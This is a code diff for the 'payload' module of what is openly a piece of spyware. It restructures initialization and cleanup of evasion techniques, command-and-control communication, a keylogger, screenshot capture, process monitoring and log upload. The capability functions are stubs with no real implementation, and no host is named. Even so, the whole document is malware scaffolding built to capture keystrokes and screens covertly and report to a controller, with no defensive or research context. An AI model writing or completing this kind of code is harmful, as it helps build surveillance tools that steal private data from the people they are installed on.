@@ -1,68 +1,88 @@
 #include "payload.h"
-#include "payload_config.h"
 #include "evasion.h"
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <pthread.h>
+#include "c2_communication_fixed.h"
 
-static pthread_t keylogger_thread;
-static pthread_t screenshot_thread;
-static pthread_t c2_thread;
-static int payload_running = 0;
+static int keylogger_running = 0;
+static int screenshot_running = 0;
+static int process_monitor_running = 0;
 
-void init_payload() {
-	// Initialize evasion techniques
-	enable_evasion();
-	
-	// Create necessary directories
-	mkdir(SCREENSHOT_PATH, 0700);
-	
-	payload_running = 1;
-	
-	// Start keylogger thread
-	pthread_create(&keylogger_thread, NULL, keylogger_main, NULL);
-	
-	// Start screenshot thread
-	pthread_create(&screenshot_thread, NULL, screenshot_main, NULL);
-	
-	// Start C2 communication thread
-	pthread_create(&c2_thread, NULL, c2_communication_main, NULL);
+int payload_init(void) {
+    // Initialize evasion techniques
+    if (evasion_init() != 0) {
+        fprintf(stderr, "Failed to initialize evasion techniques\n");
+        return -1;
+    }
+
+    // Initialize C2 communication
+    if (c2_init() != 0) {
+        fprintf(stderr, "Failed to initialize C2 communication\n");
+        evasion_cleanup();
+        return -1;
+    }
+
+    // Start core functionality
+    #if ENABLE_KEYLOGGER
+    start_keylogger();
+    #endif
+
+    #if ENABLE_SCREENSHOT
+    take_screenshot();
+    screenshot_running = 1;
+    #endif
+
+    #if ENABLE_PROCESS_MONITOR
+    monitor_processes();
+    #endif
+
+    return 0;
 }
 
-void stop_payload() {
-	payload_running = 0;
-	
-	// Wait for threads to exit
-	pthread_join(keylogger_thread, NULL);
-	pthread_join(screenshot_thread, NULL);
-	pthread_join(c2_thread, NULL);
-	
-	// Cleanup
-	disable_evasion();
+void payload_cleanup(void) {
+    // Stop core functionality
+    #if ENABLE_KEYLOGGER
+    stop_keylogger();
+    #endif
+
+    // Cleanup C2 communication
+    c2_cleanup();
+
+    // Cleanup evasion techniques
+    evasion_cleanup();
 }
 
-int is_payload_running() {
-	return payload_running;
+void start_keylogger(void) {
+    keylogger_running = 1;
+    // Implementation would go here
 }
 
-// Keylogger main function
-void* keylogger_main(void* arg) {
-	// Implementation goes here
-	while (payload_running) {
-		// Keylogger logic
-		sleep(1);
-	}
-	return NULL;
+void stop_keylogger(void) {
+    keylogger_running = 0;
+    // Implementation would go here
 }
 
-// Screenshot main function
-void* screenshot_main(void* arg) {
-	// Implementation goes here
-	while (payload_running) {
-		// Screenshot logic
-		sleep(SCREENSHOT_INTERVAL);
-	}
-	return NULL;
+void take_screenshot(void) {
+    // Implementation would go here
+}
+
+void monitor_processes(void) {
+    process_monitor_running = 1;
+    // Implementation would go here
+}
+
+int save_logs(const char *data, size_t size) {
+    // Implementation would go here
+    return 0;
+}
+
+int upload_logs(void) {
+    // Implementation would go here
+    return 0;
+}
+
+const char *get_payload_version(void) {
+    return PAYLOAD_VERSION;
+}
+
+const char *get_payload_name(void) {
+    return PAYLOAD_NAME;
 }
